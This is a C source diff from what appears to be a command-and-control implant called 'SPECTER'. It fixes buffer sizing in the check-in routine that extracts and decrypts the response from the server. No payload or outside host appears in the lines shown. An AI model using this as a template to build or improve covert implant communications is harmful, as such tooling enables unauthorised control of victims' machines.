@@ -1770,21 +1770,28 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 #ifndef SPECTER_BAREBONE
         if (comms->profile && comms->profile->initialized) {
             /* Profile-driven: extract -> transform_recv (all heap) */
-            extracted = (BYTE *)heap_alloc_cached(4096);
+            DWORD extracted_cap = body_len + 1;
+            DWORD resp_plain_cap = COMMS_RESPONSE_MAX_SIZE;
+            if (extracted_cap < 4096)
+                extracted_cap = 4096;
+            if (extracted_cap > COMMS_RESPONSE_MAX_SIZE)
+                extracted_cap = COMMS_RESPONSE_MAX_SIZE;
+
+            extracted = (BYTE *)heap_alloc_cached(extracted_cap);
             if (extracted) {
                 DWORD extracted_len = 0;
                 DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
                                                           extracted, &extracted_len);
                 if (extract_ret > 0 && extracted_len > 0) {
                     COMMS_TRACE("[SPECTER] checkin: profile response extracted");
-                    resp_plain = (BYTE *)heap_alloc_cached(4096);
+                    resp_plain = (BYTE *)heap_alloc_cached(resp_plain_cap);
                     if (resp_plain) {
                         DWORD resp_plain_len = 0;
                         status = transform_recv(extracted, extracted_len,
                                                  comms->session_key,
                                                  &comms->profile->transform,
                                                  resp_plain, &resp_plain_len,
-                                                 4096);
+                                                 resp_plain_cap);
                         if (NT_SUCCESS(status) && resp_plain_len > 0) {
                             COMMS_TRACE("[SPECTER] checkin: profile response transform OK");
                             parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
@@ -1796,7 +1803,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                         } else {
                             COMMS_TRACE("[SPECTER] checkin: profile response transform failed");
                         }
-                        spec_memset(resp_plain, 0, 4096);
+                        spec_memset(resp_plain, 0, resp_plain_cap);
                     }
                 } else {
                     COMMS_TRACE("[SPECTER] checkin: profile response extract empty");
